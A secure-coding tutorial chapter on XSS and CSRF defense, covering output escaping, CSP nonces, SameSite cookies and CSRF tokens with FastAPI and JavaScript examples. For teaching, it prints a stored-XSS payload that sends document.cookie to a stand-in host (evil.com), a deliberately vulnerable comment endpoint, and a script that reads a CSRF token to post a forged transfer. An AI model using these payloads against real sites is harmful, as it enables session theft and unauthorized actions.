---
series: secure-coding-101
episode: 8
title: "Secure Coding 101 (8/10): XSS and CSRF Defense"
status: content-ready
targets:
  tistory: false
  medium: true
  hashnode: true
  mkdocs: true
  ebook: true
language: en
tags:
  - XSS
  - CSRF
  - CSP
  - SecureCoding
  - WebSecurity
seo_description: Output escaping, CSP, SameSite cookies, CSRF tokens, and a five-step playbook to defend against browser-side attacks.
last_reviewed: '2026-05-15'
---

# Secure Coding 101 (8/10): XSS and CSRF Defense

The browser is a convenience layer for legitimate users, but it is also one of the most effective execution environments available to an attacker. A single comment rendered unsafely can become script execution, and a state-changing endpoint that trusts cookies alone can turn a different site into a trigger for actions the user never intended to perform.

This is the 8th post in the Secure Coding 101 series.

In this chapter, we will treat browser security as a system of output escaping, CSP, cookie policy, and request verification rather than as a single sanitization trick. That framing makes it easier to see when the browser is acting on the application's behalf and when it has effectively become the attacker's tool.

> XSS runs attacker-controlled code in our page. CSRF abuses the user's existing authority to send a request they did not mean to send.


![secure coding 101 chapter 8 flow overview](https://yeongseon-books.github.io/book-public-assets/assets/secure-coding-101/08/08-01-concept-at-a-glance.en.png)
*secure coding 101 chapter 8 flow overview*

## Questions to Keep in Mind

- What boundary should you inspect first when applying XSS and CSRF Defense?
- Which signal should the example or diagram make visible for XSS and CSRF Defense?
- What failure should be prevented first when XSS and CSRF Defense reaches a real system?

## Questions This Chapter Answers

- The three flavors of *XSS*
- The role of *output escaping* and *CSP*
- How *CSRF* works
- *SameSite cookies* and *CSRF tokens*
- A five-step defense and five common mistakes

## Why It Matters

A single *XSS* can hijack the session. *CSRF* triggers transfers and deletes *without the user knowing*.

> *Default rule — *escape on output, verify origin on request*.*

## Key Terms

- **Reflected XSS**: input from the URL *echoed straight back*.
- **Stored XSS**: input *saved in the DB* and rendered later.
- **DOM XSS**: client JS inserts via *innerHTML* or similar.
- **CSP**: the browser executes *only code from allowed origins*.
- **CSRF token**: bind requests to an *unguessable token*.

## Before/After

**Before**: `<div>{{ comment }}</div>` rendered as-is. A `<script>` tag *runs*.

**After**: Escape on output, apply *CSP*, set cookies to *SameSite=Lax*, attach a *CSRF token* on state-changing requests.

## Hands-on: Defense in Five Steps

### Step 1 — Escape on output

```python
import html
def render_comment(text):
    return f"<div>{html.escape(text)}</div>"
```

### Step 2 — Content Security Policy

```python
response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
```

### Step 3 — SameSite cookies

```python
response.set_cookie(
    "session", sid,
    httponly=True, secure=True, samesite="Lax",
)
```

### Step 4 — CSRF token

```python
import secrets
def issue_csrf():
    return secrets.token_urlsafe(32)

def verify_csrf(form_token, session_token):
    return secrets.compare_digest(form_token, session_token)
```

### Step 5 — Avoid dangerous sinks

```javascript
// element.innerHTML = userInput;  // forbidden
element.textContent = userInput;    // safe
```

## Failure signals and quick verification

Browser-side issues often surface as "random logout," "weird popup," or "an action happened by itself." Those are vague symptoms unless you already know what to inspect.

```text
Symptom: CSP reports spike after a frontend release
Check first:
1. new inline scripts or third-party widget injection
2. nonce / hash mismatch in templates
3. report-only violations that should become blocking

Symptom: CSRF failures increase for a single form
Check first:
1. token not included on the rendered page
2. SameSite behavior during cross-site redirect flow
3. Origin / Referer mismatch at the proxy layer
```

Writing these checks down is practical security work. It shortens the path from an ambiguous user complaint to a concrete browser-side cause.

## Stored XSS: Reproduction and Defense

Stored XSS is when an attack payload is saved in the database and executes whenever another user views that data. Comments, profile names, and post bodies are the most common injection points.

```python
# Vulnerable code — renders stored comments directly
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()
comments_db = []

@app.post("/comments")
async def add_comment(body: dict):
    comments_db.append(body["text"])  # No issue at save time
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def list_comments():
    # Vulnerable: inserts stored value directly into HTML
    items = "".join(f"<li>{c}</li>" for c in comments_db)
    return f"<ul>{items}</ul>"

# Attacker stores this comment:
# <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
# → session cookie stolen when any user views the comment list
```

```python
# Fix: escape at output time
import html

@app.get("/comments", response_class=HTMLResponse)
async def list_comments_safe():
    items = "".join(f"<li>{html.escape(c)}</li>" for c in comments_db)
    return f"<ul>{items}</ul>"
    # <script> → &lt;script&gt; — rendered as text, not executed
```

Stored XSS is especially dangerous because the payload keeps executing without the attacker being present. Once stored, every user who visits the page becomes a victim.

## Context-Specific Escape Rules

The most common XSS defense mistake is thinking "HTML escaping is enough." The required encoding differs by output location.

```python
import html
import json
import urllib.parse

user_input = '"><script>alert(1)</script>'

# 1. HTML body — HTML entity escaping
safe_html = html.escape(user_input)
template = f"<div>{safe_html}</div>"

# 2. HTML attribute — escape with quotes + always wrap in quotes
safe_attr = html.escape(user_input, quote=True)
template = f'<input value="{safe_attr}">'

# 3. JavaScript string — JSON encoding
safe_js = json.dumps(user_input)  # handles quotes, backslashes, control chars
template = f"<script>var data = {safe_js};</script>"

# 4. URL parameter — percent encoding
safe_url = urllib.parse.quote(user_input, safe="")
template = f'<a href="/search?q={safe_url}">search</a>'

# 5. CSS value — allowlist-based (restriction is safer than escaping)
ALLOWED_COLORS = {"red", "blue", "green", "black", "white"}
def safe_color(value: str) -> str:
    return value if value in ALLOWED_COLORS else "black"
```

```text
Encoding by output context:
| Context        | Encoding Method    | Dangerous Characters      |
|----------------|--------------------|---------------------------|
| HTML body      | HTML entity        | < > & " '                |
| HTML attribute | HTML entity + quotes | " ' < > &              |
| JavaScript     | JSON encode        | ' " \ / control chars     |
| URL parameter  | percent encode     | & = ? # space             |
| CSS value      | allowlist          | expression() url()        |
```

## CSP Nonce-Based Inline Script Control

Removing `'unsafe-inline'` from CSP blocks all inline scripts. But when legacy code or third-party widgets require inline execution, nonces allow only specific scripts.

```python
import secrets
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.middleware("http")
async def add_csp_nonce(request: Request, call_next):
    # Generate a new nonce per request
    nonce = secrets.token_urlsafe(16)
    request.state.csp_nonce = nonce
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data:; "
        f"report-uri /csp-report"
    )
    return response

@app.get("/page", response_class=HTMLResponse)
async def page(request: Request):
    nonce = request.state.csp_nonce
    return f"""
    <html>
    <head>
        <script nonce="{nonce}">
            // This script runs because the nonce matches
            console.log("allowed");
        </script>
    </head>
    <body>
        <script>
            // No nonce → blocked by CSP
            console.log("blocked");
        </script>
    </body>
    </html>
    """
```

```python
# CSP violation report collection endpoint
@app.post("/csp-report")
async def csp_report(request: Request):
    report = await request.json()
    logger.warning("csp_violation", extra={
        "blocked_uri": report.get("csp-report", {}).get("blocked-uri"),
        "violated_directive": report.get("csp-report", {}).get("violated-directive"),
        "document_uri": report.get("csp-report", {}).get("document-uri"),
    })
    return {"status": "received"}
```

The key to CSP nonces: a new unpredictable value must be generated per request. A fixed nonce can be discovered by an attacker and becomes meaningless.

## Double-Submit Cookie CSRF Defense

A variant of token-based CSRF defense that works without server-side session storage.

```python
import secrets
import hashlib
import hmac
from fastapi import FastAPI, Request, Response, HTTPException

app = FastAPI()
CSRF_SECRET = "server-side-secret-key"  # should be read from env var

def generate_csrf_token(session_id: str) -> str:
    """Generate CSRF token based on session ID."""
    random_value = secrets.token_urlsafe(16)
    signature = hmac.new(
        CSRF_SECRET.encode(),
        f"{session_id}:{random_value}".encode(),
        hashlib.sha256
    ).hexdigest()
    return f"{random_value}.{signature}"

def verify_csrf_token(session_id: str, token: str) -> bool:
    """Verify the token's signature."""
    parts = token.split(".", 1)
    if len(parts) != 2:
        return False
    random_value, provided_sig = parts
    expected_sig = hmac.new(
        CSRF_SECRET.encode(),
        f"{session_id}:{random_value}".encode(),
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(provided_sig, expected_sig)

@app.get("/form")
async def render_form(request: Request, response: Response):
    session_id = request.cookies.get("session_id", "")
    csrf_token = generate_csrf_token(session_id)
    # Set the same token in cookie and form hidden field
    response.set_cookie("csrf_token", csrf_token, samesite="strict", httponly=False)
    return {"csrf_token": csrf_token}  # include as hidden input in form

@app.post("/transfer")
async def transfer(request: Request):
    session_id = request.cookies.get("session_id", "")
    cookie_token = request.cookies.get("csrf_token", "")
    form = await request.form()
    form_token = form.get("csrf_token", "")

    # 1. Check cookie token matches form token
    if not hmac.compare_digest(cookie_token, form_token):
        raise HTTPException(status_code=403, detail="CSRF token mismatch")

    # 2. Check token signature is valid
    if not verify_csrf_token(session_id, form_token):
        raise HTTPException(status_code=403, detail="Invalid CSRF token")

    return {"status": "success"}
```

The Double-Submit principle: an attacker on a different domain cannot read our cookies, so they cannot place the correct token in the form. Adding a signature also prevents the attacker from setting an arbitrary identical value on both sides.

## SPA (Single Page Application) CSRF Defense

In SPA environments, the traditional hidden form field approach does not fit. Instead, use a custom-header approach.

```python
# Server: custom header verification
from fastapi import FastAPI, Request, HTTPException
import hmac

app = FastAPI()

@app.middleware("http")
async def csrf_check(request: Request, call_next):
    if request.method in ("POST", "PUT", "DELETE", "PATCH"):
        # SPAs use fetch/XHR → can add custom headers
        # Simple form submits or image tags cannot add custom headers
        csrf_header = request.headers.get("X-CSRF-Token")
        csrf_cookie = request.cookies.get("csrf_token")

        if not csrf_header or not csrf_cookie:
            raise HTTPException(status_code=403, detail="Missing CSRF token")
        if not hmac.compare_digest(csrf_header, csrf_cookie):
            raise HTTPException(status_code=403, detail="CSRF validation failed")

        # Additional: Origin header verification
        origin = request.headers.get("Origin", "")
        allowed_origins = {"https://myapp.com", "https://www.myapp.com"}
        if origin and origin not in allowed_origins:
            raise HTTPException(status_code=403, detail="Invalid origin")

    return await call_next(request)
```

```javascript
// Client (SPA): add custom header to all state-changing requests
function getCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? match[2] : null;
}

async function apiRequest(url, method, body) {
  const response = await fetch(url, {
    method: method,
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCookie('csrf_token'),  // read from cookie, send as header
    },
    credentials: 'same-origin',  // include cookies
    body: JSON.stringify(body),
  });
  return response.json();
}
```

Why the custom-header approach works: the browser's CORS policy requires a preflight (OPTIONS) request before sending a cross-origin request with custom headers. If the server does not allow that origin, the actual request never fires.

## XSS + CSRF Combined Attack

When XSS succeeds, CSRF defenses are also neutralized. If an attacker can execute a script inside your page, they can read the CSRF token and craft a legitimate-looking request.

```javascript
// XSS reads the CSRF token and performs a state change
// This is why XSS is a more fundamental threat than CSRF
const token = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: {'X-CSRF-Token': token, 'Content-Type': 'application/json'},
  credentials: 'same-origin',
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
```

This is why defense priority is **XSS prevention > CSRF defense**. CSRF protections only hold meaning when XSS is already blocked. CSP, output escaping, and HttpOnly cookies all serve this priority chain.

## CSP Gradual Hardening Strategy

Setting CSP to strict from the start can break existing functionality. In practice, start with report-only mode and harden incrementally.

```python
# Phase 1: Report-Only — collect violations without blocking
"Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline'; report-uri /csp-report"

# Phase 2: Prepare to remove unsafe-inline — introduce nonces, move inline scripts to external files
# Analyze violation reports to identify inline scripts that need migration

# Phase 3: Enforce the policy
"Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'nonce-{random}'; img-src 'self' data:; connect-src 'self' https://api.myapp.com; report-uri /csp-report"

# Phase 4: Introduce strict-dynamic (scripts loaded by trusted scripts are also allowed)
"Content-Security-Policy: script-src 'strict-dynamic' 'nonce-{random}'; object-src 'none'; base-uri 'self'"
```

```text
CSP Hardening Checklist:
- [ ] Collecting violation logs in report-only mode
- [ ] unsafe-inline removed (replaced with nonce or hash)
- [ ] unsafe-eval not used
- [ ] object-src 'none' set (blocks Flash/Java plugins)
- [ ] base-uri restricted (prevents base tag injection)
- [ ] frame-ancestors set (prevents clickjacking)
```

## What to Notice in This Code

- Output escaping must match the *context* (HTML, JS, attribute, URL).
- CSP is *defense in depth* — your *last line* if escaping leaks.
- *SameSite* and *CSRF tokens* are used *together*.

## Five Common Mistakes

1. **Rendering Markdown as *raw HTML*.** Lets `<script>` slip in.
2. **Putting input into *`innerHTML`*.** A textbook *DOM XSS*.
3. **Leaving CSP on `unsafe-inline`.** That *defeats* CSP.
4. **CSRF tokens carried in *GET*.** They end up *cached*.
5. **APIs that ignore *Origin/Referer*.** CSRF *passes through*.

## How This Shows Up in Production

Most teams keep *template auto-escape* on by default. They roll out *CSP* in *report-only* mode and harden gradually. Every state-changing API verifies a *CSRF token* or *Origin*.

The important distinction: input sanitization and output escaping are not the same thing. Input sanitization may be needed for business rules, but from a browser security perspective, encoding appropriate to the output location is the more direct defense. Missing this principle causes XSS defenses to keep failing.

## How a Senior Engineer Thinks

- *Escape by default; raw is the *exception*.*
- *Strengthen CSP *over time*.*
- *Use *SameSite and a CSRF token* — both.*
- *Never put input into the *DOM raw*; use textContent.*
- *Output escaping is safer than input sanitization.*

## Checklist

- [ ] Template *auto-escape* is enabled.
- [ ] *CSP* is in place.
- [ ] Cookies use *SameSite*.
- [ ] State-changing requests have *CSRF verification*.

## Practice Problems

1. Show one-line examples of *Reflected* and *Stored* XSS.
2. Explain how a *CSP nonce* works.
3. Name a flow that *SameSite=Strict* would break.

## Wrap-up and Next Steps

Browser-side attacks are stopped by *fundamentals*. Next we tackle the code we *did not write* — *dependency vulnerabilities*.

## Answering the Opening Questions

- **What types does XSS divide into and where does each originate?**
  - Reflected XSS occurs when URL/request input is immediately included in the response; stored XSS when a DB-saved value is later rendered; DOM-based when client JavaScript inserts input via APIs like `innerHTML`. As the Stored XSS section showed, stored XSS keeps executing without the attacker being present, making its impact scope widest.
- **What roles do output escaping and CSP share?**
  - Output escaping is the first defense line preventing input from being interpreted as code; CSP is the second defense line where the browser blocks unapproved script execution when escaping is missed. As the nonce section showed, generating an unpredictable value per request is required for CSP to be effective.
- **Why can CSRF exploit a user's privileges directly?**
  - Because browsers automatically attach cookies to cross-site requests. When an attacker site sends a request to our service, the session cookie travels along, making it indistinguishable from a legitimate user request on the server side. SameSite cookies and CSRF tokens (Double-Submit or custom headers) must verify request origin.
<!-- toc:begin -->
## In this series

- [Secure Coding 101 (1/10): What Is Secure Coding?](./01-what-is-secure-coding.md)
- [Secure Coding 101 (2/10): Input Validation](./02-input-validation.md)
- [Secure Coding 101 (3/10): Authentication and Session](./03-authentication-and-session.md)
- [Secure Coding 101 (4/10): Authorization and Permissions](./04-authorization-and-permissions.md)
- [Secure Coding 101 (5/10): Safe Data Storage](./05-safe-data-storage.md)
- [Secure Coding 101 (6/10): Secret and Key Management](./06-secret-and-key-management.md)
- [Secure Coding 101 (7/10): SQL Injection and Safe ORM Usage](./07-sql-injection-and-orm.md)
- **XSS and CSRF Defense (current)**
- Managing Dependency Vulnerabilities (upcoming)
- Safe Logging and Audit (upcoming)

<!-- toc:end -->

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN — SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

Tags: XSS, CSRF, CSP, SecureCoding, WebSecurity
